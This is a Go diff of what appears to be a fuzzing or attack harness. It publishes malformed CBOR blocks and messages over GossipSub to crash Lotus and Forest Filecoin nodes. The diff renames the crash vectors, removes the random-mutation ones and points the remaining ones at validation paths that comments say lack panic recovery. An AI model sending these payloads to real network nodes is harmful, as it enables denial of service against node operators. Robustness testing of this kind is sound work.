@@ -12,24 +12,20 @@ import (
 
 // getAllGossipAttacks returns GossipSub attack vectors targeting unprotected
 // panic paths in Lotus and Forest message/block validation.
+//
+// Removed noisy vectors (random-cbor-block, random-cbor-msg, malformed-signed-msg)
+// that produce random mutations rejected at CBOR decode with near-zero signal.
 func getAllGossipAttacks() []namedAttack {
 	return []namedAttack{
-		// --- Original vectors ---
-		{name: "gossip-null-header-block", fn: func() { runGossipAttack(gossipNullHeaderBlock) }},
-		{name: "gossip-nil-ticket-block", fn: func() { runGossipAttack(gossipNilTicketBlock) }},
-		{name: "gossip-bad-address-block", fn: func() { runGossipAttack(gossipBadAddressBlock) }},
-		{name: "gossip-malformed-signed-msg", fn: func() { runGossipAttack(gossipMalformedSignedMsg) }},
-		{name: "gossip-bad-address-msg", fn: func() { runGossipAttack(gossipBadAddressMsg) }},
-		{name: "gossip-random-cbor-block", fn: func() { runGossipAttack(gossipRandomCBORBlock) }},
-		{name: "gossip-random-cbor-msg", fn: func() { runGossipAttack(gossipRandomCBORMsg) }},
-		// --- Targeted decode/encode asymmetry vectors ---
-		// MessageValidator.Validate() has NO recover(). If Message.Cid()
-		// panics on re-serialization, the lotus node crashes.
-		{name: "gossip-addr-roundtrip-msg", fn: func() { runGossipAttack(gossipAddrRoundtripMsg) }},
-		{name: "gossip-addr-roundtrip-block", fn: func() { runGossipAttack(gossipAddrRoundtripBlock) }},
-		{name: "gossip-bitflip-msg", fn: func() { runGossipAttack(gossipBitflipMsg) }},
-		{name: "gossip-bitflip-block", fn: func() { runGossipAttack(gossipBitflipBlock) }},
-		{name: "gossip-edge-bigint-msg", fn: func() { runGossipAttack(gossipEdgeBigIntMsg) }},
+		{name: "gossip/block-null-header", fn: func() { runGossipAttack(gossipNullHeaderBlock) }},
+		{name: "gossip/block-nil-ticket", fn: func() { runGossipAttack(gossipNilTicketBlock) }},
+		{name: "gossip/block-bad-address", fn: func() { runGossipAttack(gossipBadAddressBlock) }},
+		{name: "gossip/msg-bad-address", fn: func() { runGossipAttack(gossipBadAddressMsg) }},
+		{name: "gossip/msg-addr-roundtrip", fn: func() { runGossipAttack(gossipAddrRoundtripMsg) }},
+		{name: "gossip/block-addr-roundtrip", fn: func() { runGossipAttack(gossipAddrRoundtripBlock) }},
+		{name: "gossip/msg-addr-bitflip", fn: func() { runGossipAttack(gossipBitflipMsg) }},
+		{name: "gossip/block-addr-bitflip", fn: func() { runGossipAttack(gossipBitflipBlock) }},
+		{name: "gossip/msg-bigint-edge", fn: func() { runGossipAttack(gossipEdgeBigIntMsg) }},
 	}
 }
 
@@ -42,10 +38,17 @@ type gossipPayload struct {
 // runGossipAttack creates a fresh host, joins the appropriate GossipSub topic,
 // publishes the malformed payload, then tears down.
 func runGossipAttack(buildPayload func() gossipPayload) {
-	target := rngChoice(targets)
 	payload := buildPayload()
-
 	topicName := fmt.Sprintf("/fil/%s/%s", payload.topic, networkName)
+	publishGossipPayload(topicName, payload.data)
+}
+
+// publishGossipPayload creates a fresh host, connects to a random target,
+// joins the GossipSub topic, publishes data, then tears down.
+// This is the shared publish mechanism for all gossip-based attacks
+// (gossip vectors, CBOR bombs, F3 attacks).
+func publishGossipPayload(topicName string, data []byte) {
+	target := rngChoice(targets)
 
 	h, err := pool.GetFresh(ctx)
 	if err != nil {
@@ -62,7 +65,7 @@ func runGossipAttack(buildPayload func() gossipPayload) {
 		return
 	}
 
-	if err := publishToTopic(ctx, h, topicName, payload.data); err != nil {
+	if err := publishToTopic(ctx, h, topicName, data); err != nil {
 		debugLog("[gossip] publish to %s failed: %v", topicName, err)
 	}
 }
@@ -147,46 +150,6 @@ func gossipBadAddressBlock() gossipPayload {
 	return gossipPayload{topic: "blocks", data: data}
 }
 
-// gossipRandomCBORBlock publishes a randomly mutated BlockMsg.
-func gossipRandomCBORBlock() gossipPayload {
-	headInfo := fetchChainHead(rngChoice(targets).Name)
-	opts := blockHeaderOpts{}
-	if headInfo != nil {
-		opts.overrideParentCIDs = headInfo.CIDs
-		opts.overrideHeight = headInfo.Height + 1
-		opts.overrideWeight = 999999999
-	}
-
-	// Random nil fields
-	opts.nilTicket = rngIntn(2) == 0
-	opts.nilElectionProof = rngIntn(2) == 0
-	opts.nilBLSAggregate = rngIntn(2) == 0
-	opts.nilBlockSig = rngIntn(2) == 0
-	opts.nilBeaconEntries = rngIntn(2) == 0
-	opts.nilParents = rngIntn(4) == 0
-
-	header := buildBlockHeaderCBOR(opts)
-	data := cborArray(header, cborArray(), cborArray())
-
-	// Random mutation of the final payload
-	switch rngIntn(4) {
-	case 0: // as-is
-	case 1: // truncate
-		if len(data) > 10 {
-			data = data[:5+rngIntn(len(data)-5)]
-		}
-	case 2: // flip random bytes
-		for i := 0; i < 1+rngIntn(5); i++ {
-			idx := rngIntn(len(data))
-			data[idx] = byte(rngIntn(256))
-		}
-	case 3: // append junk
-		data = append(data, randomBytes(32+rngIntn(256))...)
-	}
-
-	return gossipPayload{topic: "blocks", data: data}
-}
-
 // ---------------------------------------------------------------------------
 // Message topic attacks — target MessageValidator.Validate() (no recover)
 //
@@ -195,27 +158,6 @@ func gossipRandomCBORBlock() gossipPayload {
 //   [Version, To, From, Nonce, Value, GasLimit, GasFeeCap, GasPremium, Method, Params]
 // Signature: CBOR byte string (MarshalBinary format: [type_byte | data])
 // ---------------------------------------------------------------------------
-
-// gossipMalformedSignedMsg publishes completely malformed CBOR as a signed
-// message. Targets DecodeSignedMessage() panic paths.
-func gossipMalformedSignedMsg() gossipPayload {
-	// Various malformed payloads
-	var data []byte
-	switch rngIntn(5) {
-	case 0: // null
-		data = cborNil()
-	case 1: // empty array
-		data = cborArray()
-	case 2: // array with null message and null signature
-		data = cborArray(cborNil(), cborNil())
-	case 3: // valid-looking message with truncated signature
-		msg := buildMessageCBOR(nil)
-		data = cborArray(msg) // missing signature field
-	case 4: // random bytes
-		data = randomBytes(32 + rngIntn(256))
-	}
-	return gossipPayload{topic: "msgs", data: data}
-}
 
 // gossipBadAddressMsg publishes a SignedMessage with malformed From/To
 // addresses that deserialize from CBOR but panic when Message.Cid() calls
@@ -241,31 +183,6 @@ func gossipBadAddressMsg() gossipPayload {
 	sig := cborBytes([]byte{0x01}) // secp256k1 type, empty data
 
 	data := cborArray(msg, sig)
-	return gossipPayload{topic: "msgs", data: data}
-}
-
-// gossipRandomCBORMsg publishes a randomly mutated SignedMessage.
-func gossipRandomCBORMsg() gossipPayload {
-	msg := buildMessageCBOR(nil)
-	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
-	data := cborArray(msg, sig)
-
-	// Random mutation
-	switch rngIntn(4) {
-	case 0: // as-is
-	case 1: // truncate
-		if len(data) > 10 {
-			data = data[:5+rngIntn(len(data)-5)]
-		}
-	case 2: // flip random bytes
-		for i := 0; i < 1+rngIntn(5); i++ {
-			idx := rngIntn(len(data))
-			data[idx] = byte(rngIntn(256))
-		}
-	case 3: // append junk
-		data = append(data, randomBytes(32+rngIntn(256))...)
-	}
-
 	return gossipPayload{topic: "msgs", data: data}
 }
 
